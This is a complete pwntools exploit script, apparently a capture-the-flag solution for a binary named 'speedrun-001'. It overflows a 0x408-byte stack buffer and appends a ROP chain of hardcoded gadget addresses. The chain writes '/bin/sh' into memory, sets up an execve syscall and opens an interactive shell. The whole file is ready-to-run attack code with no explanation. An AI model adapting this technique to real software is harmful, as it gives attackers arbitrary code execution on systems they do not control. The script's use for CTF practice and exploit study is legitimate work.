from pwn import *

target = process('./speedrun-001')

bufAddr = p64(0x6b6000)
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRdx = p64(0x4498b5)
popRsi = p64(0x4101f3)
syscall = p64(0x40129c)

movGadget = p64(0x48d251)   # mov qword ptr [rax], rdx ; ret


rop = popRax
rop += bufAddr
rop += popRdx
rop += b"/bin/sh\x00"
rop += movGadget

rop += popRax
rop += p64(59)       #sys_execve
rop += popRdi
rop += bufAddr
rop += popRdx
rop += p64(0)
rop += popRsi
rop += p64(0)
rop += syscall
payload=b'0'*0x408 + rop
target.sendline(payload)

target.interactive()